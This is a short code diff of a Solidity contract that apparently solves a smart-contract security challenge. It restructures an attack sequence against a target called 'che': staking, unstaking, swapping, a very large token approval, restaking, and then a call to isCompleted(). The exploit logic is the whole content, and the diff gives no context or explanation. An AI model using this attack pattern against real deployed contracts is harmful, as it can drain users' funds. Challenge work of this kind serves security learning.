@@ -20,15 +20,10 @@ contract fig{
         che.stake(0,fig1());
         che.unstake();
         che.swap(600000);
-    }
-
-    function attack2()public{
-    
+        
         che.token().approve(address(che),10000000000 ether);
         che.stake(figure(),fig1());
-    }
-
-    function complete()public{
+        
         che.isCompleted();
     }
 }
